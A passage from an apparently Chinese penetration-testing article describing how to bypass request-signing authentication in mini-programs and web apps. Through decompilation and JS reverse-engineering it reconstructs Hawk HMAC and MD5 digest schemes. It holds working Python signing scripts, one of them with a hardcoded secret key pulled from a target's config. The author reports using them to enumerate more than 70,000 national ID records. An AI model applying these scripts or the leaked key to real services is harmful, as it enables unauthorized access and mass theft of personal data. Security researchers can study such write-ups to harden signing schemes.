---
title: Web篇 | 手把手拆解：小程序/Web端加密鉴权绕过案例全复现
url: https://mp.weixin.qq.com/s/VttDCTBhZUGlyJDh6WzTgQ
source: Doonsec's feed
date: 2026-01-10
fetch_date: 2026-01-11T03:37:06.826332
---

# Web篇 | 手把手拆解：小程序/Web端加密鉴权绕过案例全复现

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MicZ6Q9ZW0xAEZ0kJenibye5wmKz5QPQp3hFm0K8e7X90ZEtT7Yl7FxdtLhMEFb2ET98OZmLQegzFZlLNXqDBMiaw/0?wx_fmt=jpeg)

# Web篇 | 手把手拆解：小程序/Web端加密鉴权绕过案例全复现

零日安全实验室

零日安全实验室

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xAFVtam88BvoJqciaibnFfJibO8vswlI7GnuYIiasyQ3j1wLia2xTMskDH09RVia2fHvykq1WCCMZgdoqjg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xBPh5py6zW2zOqBr3VkB8ibrIhVe5U09T11XYdNgz6VwPgibFrnO2GRsiaicVuvdkxFmokovEP1iaaLvUQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xBl8xFcbWwdAWRvgRh7IvvV2l7G4H12DKTdLfDTu0LZkKibzPCe1Zgpic0Rq8iaicD4T98WQhBA04Vx0Q/640?wx_fmt=png&from=appmsg)

目 录

> 前言
>
> 案例一
>
> 案例二
>
> 案例三
>
> 案例四
>
> 案例五
>
> 案例六
>
> 总结

1

**前言**

本文通过六个真实渗透测试案例，深入剖析小程序与Web端常见的加密鉴权机制，手把手演示如何通过反编译、动态调试、JS逆向与脚本复现，精准定位加密逻辑、还原签名算法，并最终实现越权访问、信息遍历与账号接。

2

案例一

某天对小程序进行登录时发现登录进去这个接口有个personalid参数，发现也是返回了个人信息，一开始还以为是一个改id进行越权的简单漏洞，但是当我再次发包以后显示时间ts有问题，改了ts以后又说nonce有问题，到最后改了nonce，发现mac又有问题，这里就大概了解了大概的一个鉴权（ts，nonce要变化）。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MicZ6Q9ZW0xAEZ0kJenibye5wmKz5QPQp3a0o0ibAoqtRxxcElWL5J1FMFJ1vkbLVsaruFtrBozWh3qfc9AqGHgvw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MicZ6Q9ZW0xAEZ0kJenibye5wmKz5QPQp3D1UOQfILwfLeTHW74Co9t8J5x6y2N84pJ9olQMKAVk3e4FjvwJiaDpw/640?wx_fmt=jpeg)

到这里就可以发现是mac参数进行的鉴权，由于是小程序，所以反编译一下源码，这里全局搜一下mac。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xAEZ0kJenibye5wmKz5QPQp392zYzFU2NuJFgNYpbiajhrWicTndj9iacECVfbQXQcFosFjJ39uS8Vupg/640?wx_fmt=png&from=appmsg)

代码如下：

```
var o = {    ts: a,    nonce: i.nonce || e.utils.randomString(6),    method: n,    resource: r.resource,    host: r.host,    port: r.port,    hash: i.hash,    ext: i.ext,    app: i.app,    dlg: i.dlg    },    c = e.crypto.calculateMac("header", s, o),    h = 'Hawk id="' + s.id + '",ts="' + o.ts + '",nonce="' + o.nonce + '",mac="' + c + '"';
```

这里的o是ts,nonce,method,resource,host,port这些组合起来的，可以看见mac是等于c的，其实就是请求方式和url及认证头里面的东西组合起来进行了一个加密，跟进一下e.crypto.calculateMac，然后全局搜索，

如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xAEZ0kJenibye5wmKz5QPQp3G4rYINnb3btiaRib5ea6ZeccTLJ6nOgtqe013wlGrIicRk2CM2QeM0LcQ/640?wx_fmt=png&from=appmsg)

加密逻辑：

```
e.crypto = {        headerVersion: "1",        algorithms: ["sha1", "sha256"],        calculateMac: function(t, r, n) {            var i = e.crypto.generateNormalizedString(t, n);            return s["Hmac" + r.algorithm.toUpperCase()](i, r.key).toString(s.enc.Base64)        }
```

这里对calculateMac函数分析，这个函数是该对象的核心，它接受三个参数：

* t：原始数据
* r：包含算法和密钥的对象。这个对象内部有 r.algorithm（指定哈希算法，例如"sha1"或"sha256") 和 r.key（用于HMAC计算的密钥）。
* n：也就是o

```
var i = e.crypto.generateNormalizedString(t, n);
```

首先，调用e.crypto.generateNormalizedString函数，传入t和n参数。这个函数将上一步准备好的o对象（以及其他输入，如 t）按照Hawk 协议的特定规则进行**排序**和**拼接**，生成一个唯一的、标准化的字符串。这样的话就确保不管数据在原始对象中的顺序如何，只要内容不变，生成的标准化字符串就始终一致。这对于**防止因数据顺序不一致而导致的签名验证失败。**

```
return s["Hmac" + r.algorithm.toUpperCase()](i, r.key).toString(s.enc.Base64)
```

这行代码是实际进行HMAC计算和格式化的部分。

r.algorithm.toUpperCase(): 将传入的算法名称转换为大写，

例如sha1变为SHA1。“Hmac”+r.algorithm.toUpperCase(): 动态构建HMAC算法名称，

例如“HmacSHA1”或“HmacSHA256”。

s[“Hmac...”](i, r.key): 使用标准化字符串i和密钥r.key来调用HMACC算法进行计算，返回一个HMAC结果。

.toString(s.enc.Base64): 将计算出的HMAC结果转换为**Base64编码**的字符串，并作为函数的最终返回值。

这里就需要找到key了

一开始全局搜索key但是太多了

然后联想到一般key都会放在配置文件里面

搜了一下config

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xAEZ0kJenibye5wmKz5QPQp3ymHHdqjiaCWImd27ldHdWjPUVTB9YqNg72zAT4leAVJnDllJJ0vpn5Q/640?wx_fmt=png&from=appmsg)

写个脚本试一下能不能使用

```
import base64import hmacimport hashlibimport timedef generate_normalized_string(header_type, artifacts):    """生成 Hawk 规范化字符串"""    n = f"hawk.1.{header_type}\n"    n += f"{artifacts['ts']}\n"    n += f"{artifacts['nonce']}\n"    n += f"{artifacts['method'].upper()}\n"    n += f"{artifacts['resource']}\n"    n += f"{artifacts['host'].lower()}\n"    n += f"{artifacts['port']}\n"    n += f"{artifacts['hash']}\n"  # 空字符串    # 无 ext 参数    n += "\n"    # 无 app 和 dlg 参数    return ndef calculate_mac(credentials, artifacts):    """计算 Hawk MAC 值"""    normalized_str = generate_normalized_string("header", artifacts)    print("规范化字符串:")    print("----------------------")    print(normalized_str)    print("----------------------")    key_bytes = credentials["key"].encode("utf-8")    msg_bytes = normalized_str.encode("utf-8")    # 使用 SHA-256    hmac_digest = hmac.new(key_bytes, msg_bytes, hashlib.sha256).digest()    return base64.b64encode(hmac_digest).decode("utf-8")# 输入参数credentials = {    "id": "wasx",    "key": "edb8bc95-a000-4ca0-81b8-dd2145050a70F61FB1981510CE5D3988193864A328A3",    "algorithm": "sha256"}timestamp = time.time()timestamps=int(timestamp)artifacts = {        "ts": timestamps,        "nonce": "6a0d5d576135004ead6cf4795e5b6112",        "method": "GET",        "resource": "xxxx/List/QueryByPersonalid?personalid=668223",        "host": "xxxxxxx",        "port": "443",        "hash": ""}    # 计算并验证 MACcalculated_mac = calculate_mac(credentials, artifacts)print(f"计算 MAC: {calculated_mac}")
```

发现可以使用，后续也是遍历了7w+的sfz信息。

3

案例二

这里是一个预约功能的地方，需要填写个人信息包括了身份证号，可以看见有个personCode参数，后面跟了一串数字，然后下滑可以发现返回了个人信息，原本想遍历一下这个参数的，但是说参数过期了，想都不要想肯定是digest加密导致的。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xAEZ0kJenibye5wmKz5QPQp3UYVgXUzF4vgvqmgxuzPqR7jPiavamibnOK4Pn9bTTeQ5fUuCamnBURYQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xAEZ0kJenibye5wmKz5QPQp3ib3K6t4YSicAnUtwHhtIlFaxLCUk1q1C07m4v3Wlx5US1kiaca4Q6rt7w/640?wx_fmt=png&from=appmsg)

一样的方法反编译一下，找到加密地方：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xAEZ0kJenibye5wmKz5QPQp35pK2dTiaKnoa4IOqgNE0JCoibMNzk7rX5K1nEhmxhlM5xvJj9KiayoXNQ/640?wx_fmt=png&from=appmsg)

这个就比较简单了，只有有个hexMD5加密，简单分析一下代码，

```
 var n = a.domainUrl(o.domain).match(/[^\/]+$/)[1]
```

这个正则表达式是匹配字符串末尾的非斜杠字符。

例如，如果a.domainUrl(o.domain)返回 “https://example.com/api”，那么它会匹配 “api”。

```
u = o.url.includes("?") ? o.url.split("?")[0] : o.url
```

这行代码处理URL，去除查询参数。

o.url.includes(“?”)：检查o.url字符串是否包含问号?

o.url.split(“?”)[0]：如果包含?，则用?分割 URL 字符串，并取第一个部分，即问号之前的部分。

```
digest: t.hexMD5("/".concat(n, "/") + u + s).toUpperCase()
```

* “/”.concat(n, “/”)：将字符串n用斜杠包裹起来。例如，如果n是“api”，结果就是“/api/”。

* +u+s：将上一步的结果、不带参数的URL“u”和时间戳“s”拼接在一起。

* t.hexMD5(...)：调用一个名为t的对象上的hexMD5方法，对拼接后的字符串进行MD5哈希计算。MD5是一种常见的哈希算法，用于生成一个唯一的、固定长度的散列值。

* .toUpperCase()：将生成的MD5散列值转换为大写。

分析完毕，开始写脚本：

```
import reimport hashlibimport timedef calculate_digest(domain, url, timestamp):    # 提取domain的最后路径片段    match = re.search(r'\/([^\/]+)\/?$', domain)    if not match:        raise ValueError("Invalid domain format")    n = match.group(1)    # 去掉URL的查询参数    u = url.split('?', 1)[0]    # 拼接字符串    s = f"/{n}/{u}{timestamp}"    # 计算MD5并转大写    return hashlib.md5(s.encode('utf-8')).hexdigest().upper()# 示例调用if __name__ == "__main__":    domain = 'xxxxx'    url = 'xxxxx'    timestamp = int(time.time() * 1000)  # 获取毫秒级时间戳    print("Timestamp:", timestamp)    digest = calculate_digest(domain, url, timestamp)print("digest:", digest)
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xAEZ0kJenibye5wmKz5QPQp3fK7VPn24BZ9My3geCWgYVnAVgH23GxGL3iaFN50IgyAhziaFPsujAmJA/640?wx_fmt=png&from=appmsg)

4

案例三

这里说一下快速找到加密点的方法，

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MicZ6Q9ZW0xAEZ0kJenibye5wmKz5QPQp3zjAKIeQGK93cHDqHDA8niakCZE7CAR3L81ZVwCIkRtG2Kemw2NpyhRQ/640?wx_fmt=jpeg)

xhr打断点进行定位加密，选一个标志性的进行定位，

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xAEZ0kJenibye5wmKz5QPQp3nMPHwxjcGx97HwzcCeian4lmJtXcwBYZbckCXfIv6mLA0hEJ4zuG40A/640?wx_fmt=png&from=appmsg)

加入xhr

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xAEZ0kJenibye5wmKz5QPQp32wMXTGd9pLXxlYCAUwNjUJ42FnuHKeibMY2rKW6wj8rcVSTe6eS3g2A/640?wx_fmt=png&from=appmsg)

刷新页面，断住了，接下来看它的作用域来寻找加密参数。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xAEZ0kJenibye5wmKz5QPQp3qhfLjvL0frjTzAWbkAYaoiarWjyeo2cCIbSYFYDLutMxECwxZ3IVYmw/640?wx_fmt=png&from=appmsg)

往上跟栈，发现加密参数

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xAEZ0kJenibye5wmKz5QPQp3vS73bUicp0k12ZVGbGSo5gdx5vO1C5...